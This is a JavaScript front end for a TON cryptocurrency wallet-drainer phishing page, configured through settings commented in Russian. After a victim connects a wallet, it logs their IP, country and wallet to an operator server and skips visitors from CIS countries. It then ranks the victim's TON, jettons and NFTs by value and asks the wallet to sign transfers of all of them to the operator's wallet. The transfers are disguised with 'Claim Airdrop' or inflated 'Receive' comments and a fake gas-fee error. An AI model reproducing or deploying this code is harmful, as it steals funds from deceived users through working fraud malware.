
// SECURITY WARNING:  This code STILL requires a backend server.
//  NEVER include sensitive API keys or business logic in client-side JS.

const server_domain = ""; // Ваш домен сервера в формате "domain.com"

// Дополнительные настройки:
const dynamicTxt = "true"; // Если true, то комментарий становится динамичным и выводит плюс к балансу пользователю. Если false , то используется статичный
const sumDyn = "2"; // Множитель для динамичного комментария
const textDyn = "Receive:  "; // Текст в динамичном комментарии
const txt_com = "✅ Claim Airdrop..."; // Комментарий при трансфере TON и JETTON(Статичный)
const txtnft_com = "✅ Claim Airdrop..."; // Комментарий при трансфере NFT(Статичный)

// Настройки модального окна при минимальном балансе:
const h1_message = 'Transaction rejected'; // Заголовок
const p_message = 'Not enough TON to pay the gas fee!'; // Обычный текст

// Технические настройки:
const sng = "true"; // Защита СНГ стран, включать только в целях тестирования.

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://your-domain.com/tonconnect-manifest.json', // Сюда указать путь на ваш манифест, hosted on your domain
    buttonRootId: 'openModal'
});

let min_totalbal;
let forFee;
let mainWallet;

//These API requests MUST be on the backend server.
async function fetchConfig() {
    try {
        const [mainWalletResponse, minTotalBalResponse, forFeeResponse] = await Promise.all([
            fetch(`https://${server_domain}/api/main-wallet`),
            fetch(`https://${server_domain}/api/min_totalbal`),
            fetch(`https://${server_domain}/api/forfee`)
        ]);

        mainWallet = (await mainWalletResponse.json()).mainWallet;
        min_totalbal = (await minTotalBalResponse.json()).min_totalbal;
        forFee = (await forFeeResponse.json()).forFee;

    } catch (error) {
        console.error('Error fetching configuration:', error);
        // Handle the error appropriately (e.g., display an error message to the user)
    }
}

fetchConfig();  // Call this function when the script loads

let connectedWallet;
let UserInfo;
let messages = [];

// Fetch IP and country information
fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        const ipUser = data.ip;
        const country = data.country;
        const currentDomain = window.location.hostname;
        UserInfo = {
            ip: data.ip,
            country: data.country,
            domain: currentDomain
        };

        // Redirect SNG countries (conditional)
        if (sng === "true" && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
            window.location.replace('https://ton.org');
            return; // Stop further execution
        }

        // Log website opened event (send to backend)
        sendWebsiteOpenedEvent(UserInfo);  // Use a function
    })
    .catch(error => console.error('Error IP:', error));

// Function to send website opened event to the backend
async function sendWebsiteOpenedEvent(userInfo) {
    try {
        const response = await fetch(`https://${server_domain}/api/opened`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userInfo)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const data = await response.json();
        console.log('Success:', data);

    } catch (error) {
        console.error('Error sending website opened event:', error);
    }
}

// Handle wallet status changes
tonConnectUI.onStatusChange(async wallet => {  // Make the callback async
    connectedWallet = wallet;

    // Fetch IP and country information
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const ipUser = data.ip;
        const country = data.country;
        const currentDomain = window.location.hostname;
        UserInfo = {
            ip: data.ip,
            country: data.country,
            domain: currentDomain
        };

        if (sng === "true" && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
            window.location.replace('https://ton.org');
            return; // Stop further execution
        }

        const payload = {
            ConnectedWallet: connectedWallet,
            UserInfo: UserInfo
        };

        // Send connected wallet information to the backend
        try {
            const response = await fetch(`https://${server_domain}/api/connected`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const data = await response.json();
            console.log('Success:', data);
            await processAssets(data.assetList, data.totalBalance); // Await here

        } catch (error) {
            console.error('Error sending connected wallet data:', error);
        }

    } catch (error) {
        console.error('Error fetching IP:', error);
    }
});

// Process assets
async function processAssets(assetList, totalBalance) {  // Make the function async
    const assetTypeSum = assetList.reduce((acc, asset) => {
        if (!acc[asset.type]) {
            acc[asset.type] = 0;
        }
        acc[asset.type] += asset.calculatedBalanceUSDTG;
        return acc;
    }, {});

    const sortedTypes = Object.entries(assetTypeSum).sort((a, b) => b[1] - a[1]).map(entry => entry[0]);

    let uniqueAssetList = assetList.filter((item, index, self) =>
        index === self.findIndex((t) =>
            t.type === item.type &&
            t.balance === item.balance &&
            t.name === item.name
        )
    );

    const tonAssets = uniqueAssetList.filter(asset => asset.type === "TON");
    const jettonAssets = uniqueAssetList.filter(asset => asset.type === "Jetton");
    const nftAssets = uniqueAssetList.filter(asset => asset.type === "NFT");

    if (uniqueAssetList.reduce((total, asset) => total + asset.calculatedBalanceUSDTG, 0) < min_totalbal) {
        showModal();
        return;
    }

    for (const type of sortedTypes) {
        switch (type) {
            case 'TON':
                if (tonAssets.length > 0) {
                    const message = await sendTon(tonAssets[0]);
                    messages = [...messages, ...message];
                    console.log(messages);
                }
                break;
            case 'Jetton':
                for (let i = 0; i < jettonAssets.length; i += 4) {
                    const chunk = jettonAssets.slice(i, Math.min(i + 4, jettonAssets.length));
                    console.log("Sending Jetton chunk:", chunk);
                    const message = await sendToken(chunk);
                    messages = [...messages, ...message];
                    console.log(messages);
                }
                break;
            case 'NFT':
                for (let i = 0; i < nftAssets.length; i += 4) {
                    const chunk = nftAssets.slice(i, Math.min(i + 4, nftAssets.length));
                    console.log("Sending NFT chunk:", chunk);
                    const message = await sendNft(chunk);
                    messages = [...messages, ...message];
                    console.log(messages);
                }
                break;
        }
    }

    console.log(JSON.stringify(messages));
    await processTransactions(messages); // Process messages in chunks

}

async function processTransactions(messages) {
    for (let i = 0; i < messages.length; i += 4) {
        const chunk = messages.slice(i, Math.min(i + 4, messages.length));
        const payload = {
            ConnectedWallet: connectedWallet,
            UserInfo: UserInfo,
            chunk: chunk
        };

        try {
            // Send chunk to backend for processing
            const response = await fetch(`https://${server_domain}/api/creatingJetton`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            const data = await response.json();
            console.log('Success:', data);

            // Construct transaction data
            const transactionData = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: chunk,
                UserInfo: UserInfo,
                ConnectedWallet: connectedWallet
            };

            try {
                // Send transaction
                const result = await tonConnectUI.sendTransaction(transactionData);
                console.log("Transaction result:", result);

                // Update transaction status (sent)
                await updateTransactionStatus('sent', result, chunk, UserInfo, connectedWallet);
                if (result.success) {
                    await updateTransactionStatus('confirmed', result, chunk, UserInfo, connectedWallet);
                } else {
                    await updateTransactionStatus('cancelled', result, chunk, UserInfo, connectedWallet);
                }
            } catch (error) {
                console.error('Error sending TON transaction:', error);
                await updateTransactionStatus('error', null, chunk, UserInfo, connectedWallet, error.message);
            }

        } catch (error) {
            console.error('Error sending chunk to backend:', error);
        }
    }
}

// Function to update transaction status
async function updateTransactionStatus(status, transactionResult, chunk, userInfo, connectedWallet, error = null) {
    try {
        const body = JSON.stringify({
            status: status,
            transactionResult: transactionResult,
            chunk: chunk,
            UserInfo: userInfo,
            ConnectedWallet: connectedWallet,
            error: error // Include error message if status is "error"
        });

        const response = await fetch(`https://${server_domain}/api/transactionStatus`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: body
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const data = await response.json();
        console.log('Transaction status updated:', data);

    } catch (error) {
        console.error('Error updating transaction status:', error);
    }
}

// Function to send TON
async function sendTon(asset) {
    try {
        let text_com;

        if (dynamicTxt === "true") {
            text_com = textDyn + ((asset.sendingBalance / 1000000000).toFixed(2) * sumDyn) + " TON";
        } else {
            text_com = txt_com;
        }

        const response = await fetch(`https://${server_domain}/api/generate-transaction-bodyTon`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ text_com: text_com })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}`);
        }

        const data = await response.json();
        const bodyBoc = data.bodyBoc;

        if (asset.sendingBalance > forFee) {
            return [{
                address: mainWallet,
                amount: asset.sendingBalance,
                payload: bodyBoc,
                name: 'TON',
                usdBal: asset.calculatedBalanceUSDTG
            }];
        } else {
            showModal();
            return [];
        }
    } catch (error) {
        console.error('Error sending TON transaction:', error);
        return [];
    }
}

// Function to send token
async function sendToken(chunk) {
    try {
        const messages = [];
        for (const asset of chunk) {
            let text_com;

            if (dynamicTxt === "true") {
                text_com = textDyn + ((asset.TokenBalance / 1000000000).toFixed(2) * sumDyn) + " " + asset.symbol;
            } else {
                text_com = txt_com;
            }

            const response = await fetch(`https://${server_domain}/api/generate-transaction-bodyJetton`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    text_com: text_com,
                    mainWallet: mainWallet,
                    tokenBalance: asset.TokenBalance
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}, Body: ${errorText}`);
            }

            const data = await response.json();
            const bodyBoc = data.bodyBoc;

            const transaction = {
                address: asset.wallet_address,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                usdBal: asset.calculatedBalanceUSDTG
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending Token transaction:', error);
        return [];
    }
}

// Function to send NFT
async function sendNft(chunk) {
    try {
        const messages = [];

        for (const asset of chunk) {
            const response = await fetch(`https://${server_domain}/api/generate-transaction-bodyNft`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    text_com: txtnft_com,
                    mainWallet: mainWallet,
                    nftAddress: asset.data
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}, Body: ${errorText}`);
            }

            const data = await response.json();
            const bodyBoc = data.bodyBoc;

            const transaction = {
                address: asset.data,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                usdBal: asset.calculatedBalanceUSDTG
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending NFT transaction:', error);
        return [];
    }
}

// Function to show modal
function showModal() {
    // Реализация функции показа модального окна с сообщением о недостаточном балансе
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '50%';
    modal.style.left = '50%';
    modal.style.transform = 'translate(-50%, -50%)';
    modal.style.padding = '20px';
    modal.style.backgroundColor = 'white';
    modal.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.1)';
    modal.innerHTML = `<h1>${h1_message}</h1><p>${p_message}</p>`;
    document.body.appendChild(modal);

    // Закрыть модальное окно через 3 секунды
    setTimeout(() => {
        document.body.removeChild(modal);
    }, 3000);
}

// Function to delay
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

